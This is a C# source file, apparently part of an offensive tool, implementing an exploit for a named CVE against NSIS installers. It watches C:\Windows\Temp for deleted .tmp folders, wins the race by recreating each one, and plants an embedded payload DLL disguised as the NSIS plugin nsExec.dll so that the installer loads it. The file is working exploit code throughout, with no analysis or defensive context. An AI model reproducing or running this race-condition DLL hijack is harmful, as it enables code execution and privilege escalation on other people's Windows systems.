using System;
using System.IO;
using System.Reflection;

namespace IMEClient.plugins
{
    // CVE-2025-43715: races NSIS plugin directory creation after a .tmp deletion in C:\Windows\Temp.
    internal class NSISPlugin : InstallerPlugin
    {
        private readonly byte[] _payload;

        /// <summary>Embedded resource name to load as the payload bytes.</summary>
        public virtual string PayloadResourceName => DefaultResource;

        /// <summary>Filename written into the hijacked temp directory.</summary>
        public virtual string PayloadFileName => "nsExec.dll";

        private const string DefaultResource = "payload.x86.dll";

        public NSISPlugin(string[] args) : base(args)
        {
            _payload = LoadPayload();
        }

        private byte[] LoadPayload()
        {
            var data = ReadResource(PayloadResourceName);
            if (data.Length > 0)
                return data;

            // Fall back to default payload if plugin-specific one isn't embedded
            if (!PayloadResourceName.Equals(DefaultResource, StringComparison.OrdinalIgnoreCase))
            {
                Console.WriteLine($"[{Name}] Falling back to {DefaultResource}");
                return ReadResource(DefaultResource);
            }

            return data;
        }

        public override void OnFileEvent(object sender, FileSystemEventArgs e)
        {
            // Only care about folder deletions ending in .tmp under C:\Windows\Temp
            if (e.ChangeType != WatcherChangeTypes.Deleted)
                return;
            if (!e.FullPath.StartsWith(@"C:\Windows\Temp\", StringComparison.OrdinalIgnoreCase))
                return;
            if (!e.FullPath.EndsWith(".tmp", StringComparison.OrdinalIgnoreCase))
                return;

            try
            {
                // Re-create the deleted folder and drop the payload inside
                Directory.CreateDirectory(e.FullPath);
                var target = Path.Combine(e.FullPath, PayloadFileName);
                File.WriteAllBytes(target, _payload);
                Console.WriteLine($"[{Name}] Wrote {PayloadFileName} -> {target}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[{Name}] Error writing payload: {ex.Message}");
            }
        }

        /// <summary>
        /// Read an embedded resource by name.
        /// Tries exact match first, then falls back to EndsWith so that
        /// namespace-prefixed names (e.g. "IMEClient.payload.dll") still resolve.
        /// </summary>
        internal static byte[] ReadResource(string name)
        {
            var asm = Assembly.GetExecutingAssembly();
            string match = null;
            foreach (var res in asm.GetManifestResourceNames())
            {
                if (res.Equals(name, StringComparison.OrdinalIgnoreCase))
                {
                    match = res;
                    break;
                }
                if (match == null && res.EndsWith("." + name, StringComparison.OrdinalIgnoreCase))
                    match = res;
            }

            if (match == null)
            {
                Console.WriteLine($"[NSIS] Warning: embedded resource '{name}' not found");
                return Array.Empty<byte>();
            }

            using (var stream = asm.GetManifestResourceStream(match))
            {
                var buf = new byte[stream.Length];
                stream.Read(buf, 0, buf.Length);
                return buf;
            }
        }
    }
}